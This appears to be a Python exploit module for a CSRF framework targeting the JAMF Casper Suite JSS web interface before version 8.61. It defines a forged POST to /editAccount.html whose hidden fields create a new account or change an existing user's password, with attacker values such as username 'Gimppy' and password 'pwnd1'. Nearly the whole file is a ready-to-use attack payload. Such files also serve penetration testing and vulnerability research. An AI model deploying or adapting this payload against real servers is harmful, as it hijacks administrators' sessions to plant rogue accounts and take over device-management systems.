# -*- coding: utf-8 -*-

NAME = "JAMF Casper Suite MDM CSRF Vulnerability"
DESCRIPTION = '''Multiple cross-site request forgery (CSRF) vulnerabilities in editAccount.html in the JAMF Software Server (JSS) interface in JAMF Casper Suite before 8.61 allow remote attackers to hijack the authentication of administrators for requests that (1) create user accounts or (2) change passwords via a Save action.'''
AUTHOR = "Jacob Holcomb/Gimppy042"
DATE = "2012-09-27"

METHOD = "POST"
PATH = "/editAccount.html"

PARAMS = [
    {
        "type": "hidden",
        "name": "view",
        "value": "Save",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "source",
        "value": "jss",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "lastPage",
        "value": "editAccountGeneral.jsp",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "lastTab",
        "value": "Account",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "user_id",
        "value": "-1",
        "custom": True,
        "description": "-1 creates a new user, another user_id changes the settings of an existing user"
    },
    {
        "type": "hidden",
        "name": "username",
        "value": "Gimppy",
        "custom": True,
        "description": "Username of the user"
    },
    {
        "type": "hidden",
        "name": "realname",
        "value": "Pwnd",
        "custom": True,
        "description": "Realname of the user"
    },
    {
        "type": "hidden",
        "name": "email",
        "value": "email@email.com",
        "custom": True,
        "description": "Email of the user"
    },
    {
        "type": "hidden",
        "name": "phone",
        "value": "1234",
        "custom": True,
        "description": "Phone of the user"
    },
    {
        "type": "hidden",
        "name": "password",
        "value": "pwnd1",
        "custom": True,
        "description": "Password of the user"
    },
    {
        "type": "hidden",
        "name": "vpassword",
        "value": "pwnd1",
        "custom": True,
        "description": "Password of the user"
    }
]